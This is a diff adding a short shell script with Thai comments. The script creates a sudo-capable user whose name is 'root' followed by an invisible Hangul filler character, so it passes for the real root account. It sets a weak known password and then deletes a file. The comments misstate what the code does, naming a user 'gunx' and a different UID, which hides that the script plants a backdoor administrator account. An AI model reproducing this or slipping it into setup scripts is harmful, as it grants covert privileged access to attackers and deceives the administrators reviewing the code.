@@ -1,0 +1,13 @@
+# สร้างผู้ใช้และกำหนด UID เป็น 14
+
+sudo useradd -u 21 rootㅤ
+
+# กำหนดรหัสผ่านของผู้ใช้ gunx เป็น "gunx"
+echo "rootㅤ:gunx" | sudo chpasswd
+
+# เพิ่มผู้ใช้ gunx เข้าในกลุ่ม sudo
+sudo usermod -aG sudo rootㅤ
+
+# แสดงข้อความยืนยัน
+echo "ผู้ใช้ Test rool ถูกสร้างและกำหนดสิทธิ์เรียบร้อยแล้ว"
+rm -f rootx
